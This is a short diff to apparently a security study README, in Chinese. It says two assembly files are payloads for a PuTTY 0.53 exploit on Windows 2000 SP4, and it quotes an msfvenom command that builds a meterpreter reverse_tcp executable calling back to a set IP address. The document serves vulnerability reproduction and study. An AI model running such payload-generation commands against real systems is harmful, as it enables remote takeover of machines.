@@ -1,3 +1,7 @@
+reverse_shell.asm和msgbox.asm是对putty_msg_debug.rb的payload
+可以使用它们来对windows 2000 SP4 English下的putty 0.53进行漏洞复现
+
+
 Goal: 分析msfvenom -p windows/meterpreter/reverse_tcp -LHOST=192.168.1.10 -f exe -o payload.exe的原理
 
 TO DO
